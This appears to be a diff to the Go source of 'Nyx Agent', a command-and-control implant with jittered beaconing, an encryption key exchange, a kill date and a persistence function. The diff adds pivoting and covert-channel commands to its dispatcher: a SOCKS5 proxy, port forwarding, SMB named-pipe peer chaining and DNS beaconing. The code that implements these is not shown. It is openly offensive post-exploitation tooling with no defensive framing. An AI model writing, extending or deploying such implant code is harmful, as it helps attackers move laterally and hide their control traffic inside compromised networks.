@@ -28,6 +28,7 @@ var JitterMode    = "linear" // linear | gaussian | sinusoidal | burst
 var KillDate      = ""   // "YYYY-MM-DD" — agent self-destructs after this date
 
 var burstCounter int
+var currentAgentID string // set after first successful checkin
 
 func init() {
 	if XORKey != "" {
@@ -698,6 +699,113 @@ func dispatch(command string) (string, string) {
 		}
 		return out, "completed"
 
+	// ── Phase 4: P2P & Pivot ────────────────────────────────────────────────
+
+	case "socks5-start":
+		// usage: socks5-start <port> [user pass]
+		p := strings.SplitN(arg, " ", 3)
+		if len(p) < 1 || p[0] == "" {
+			return "usage: socks5-start <port> [user pass]", "failed"
+		}
+		port, err := strconv.Atoi(p[0])
+		if err != nil {
+			return "invalid port: " + p[0], "failed"
+		}
+		user, pass := "", ""
+		if len(p) == 3 {
+			user = p[1]
+			pass = p[2]
+		}
+		out, err := startSOCKS5(port, user, pass)
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "socks5-stop":
+		return stopSOCKS5(), "completed"
+
+	case "socks5-status":
+		return socks5Status(), "completed"
+
+	case "pfwd-start":
+		// usage: pfwd-start <local_port> <remote_host:port>
+		p := strings.SplitN(arg, " ", 2)
+		if len(p) < 2 {
+			return "usage: pfwd-start <local_port> <remote_addr>", "failed"
+		}
+		lport, err := strconv.Atoi(p[0])
+		if err != nil {
+			return "invalid port: " + p[0], "failed"
+		}
+		out, err := startPortForward(lport, p[1])
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "pfwd-stop":
+		// usage: pfwd-stop <local_port>
+		if arg == "" {
+			return "usage: pfwd-stop <local_port>", "failed"
+		}
+		lport, err := strconv.Atoi(strings.TrimSpace(arg))
+		if err != nil {
+			return "invalid port: " + arg, "failed"
+		}
+		return stopPortForward(lport), "completed"
+
+	case "smb-pipe-listen":
+		// usage: smb-pipe-listen <pipe_name>
+		if arg == "" {
+			return "usage: smb-pipe-listen <pipe_name>", "failed"
+		}
+		out, err := startPipeServer(strings.TrimSpace(arg))
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "smb-pipe-stop":
+		return stopPipeServer(), "completed"
+
+	case "smb-pipe-status":
+		return smbPipeStatus(), "completed"
+
+	case "smb-pipe-connect":
+		// usage: smb-pipe-connect <host> <pipe_name>
+		p := strings.SplitN(arg, " ", 2)
+		if len(p) < 2 {
+			return "usage: smb-pipe-connect <host> <pipe_name>", "failed"
+		}
+		out, err := connectToPipeServer(p[0], p[1])
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "dns-beacon-start":
+		// usage: dns-beacon-start <domain> [resolver_ip:port]
+		p := strings.SplitN(arg, " ", 2)
+		if len(p) < 1 || p[0] == "" {
+			return "usage: dns-beacon-start <domain> [resolver]", "failed"
+		}
+		resolver := ""
+		if len(p) == 2 {
+			resolver = p[1]
+		}
+		out, err := startDNSBeacon(p[0], resolver, currentAgentID)
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "dns-beacon-stop":
+		return stopDNSBeacon(), "completed"
+
+	case "dns-beacon-status":
+		return dnsBeaconStatus(), "completed"
+
 	case "kill":
 		fmt.Println("[!] Kill command received, exiting.")
 		os.Exit(0)
@@ -846,7 +954,7 @@ func removePersistence() string {
 }
 
 func main() {
-	fmt.Println("[*] Nyx Agent v0.8.0 starting...")
+	fmt.Println("[*] Nyx Agent v0.9.0 starting...")
 
 	// Kill date check
 	checkKillDate()
@@ -894,6 +1002,7 @@ func main() {
 		}
 
 		agentID = resp.AgentID
+		currentAgentID = agentID
 
 		// Complete ECDH key exchange on first checkin that returns server_pub
 		if resp.ServerPub != "" && !ecdhDone {
